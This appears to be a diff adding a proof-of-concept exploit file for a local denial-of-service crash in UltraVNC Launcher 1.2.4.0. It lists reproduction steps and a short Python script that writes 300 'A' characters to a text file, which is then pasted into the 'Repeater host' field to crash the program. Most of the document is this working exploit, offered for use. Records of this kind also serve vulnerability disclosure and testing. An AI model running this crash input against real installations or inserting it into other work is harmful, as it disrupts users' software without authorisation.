@@ -1,0 +1,23 @@
+# Exploit Title:  UltraVNC Launcher 1.2.4.0 - 'RepeaterHost' Denial of Service (PoC)
+# Discovery by: chuyreds 
+# Discovery Date: 2020-04-05
+# Vendor Homepage: https://www.uvnc.com/
+# Software Link : https://www.uvnc.com/component/jdownloads/send/0-/394-ultravnc-1240-x86-setup.html?Itemid=0
+# Tested Version: 1.2.4.0
+# Vulnerability Type: Local
+# Tested on OS: Windows 10 Pro x64 es
+
+#Steps to produce the crash:
+#1.- Run python code: UltraVNC_1.2.40-Launcher_RepeaterHost.py
+#2.- Open UltraVNC_1.2.40-Launcher_RepeaterHost.txt and copy content to clipboard
+#3.- Open UltraVNC Launcher
+#4.- Select "Properties"
+#5.- In "Repeater host" Paste Clipboard
+#6.- Click on "OK"
+#7.- Crashed
+
+cod = "\x41" * 300
+
+f = open('UltraVNC_1.2.40-Launcher_RepeaterHost.txt', 'w')
+f.write(cod)
+f.close()
